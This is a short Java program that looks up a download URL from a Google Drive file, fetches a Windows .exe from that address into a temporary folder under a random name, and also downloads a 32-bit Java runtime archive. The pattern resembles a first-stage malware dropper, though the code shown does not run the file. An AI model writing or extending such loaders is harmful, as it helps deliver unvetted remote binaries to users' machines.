package me.invakid.azran;

import com.google.common.io.Files;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.RandomStringUtils;

import java.io.*;
import java.net.URI;
import java.net.URL;

public class Main {

    private static final String infoURL = "https://drive.google.com/uc?export=download&id=1bDuCj7q2pwzrPES7mCD7sSRLJu856PuW";
    private static final String jreURL = "http://download.oracle.com/otn-pub/java/jdk/8u171-b11/512cd62ec5174c3487ac17c61aaa89e8/jre-8u171-windows-i586.tar.gz";

    public static void main(String[] args) throws Exception {
        String download = IOUtils.toString(URI.create(infoURL));
        System.out.println(download);

        File tempFolder = Files.createTempDir();
        File executable = new File(tempFolder, RandomStringUtils.randomAlphabetic(4) + ".exe");

        FileUtils.copyURLToFile(new URL(download), executable);

        File jre = new File(tempFolder, RandomStringUtils.randomAlphabetic(4) + ".tar.gz");

        FileUtils.copyURLToFile(new URL(jreURL), jre);
    }

}
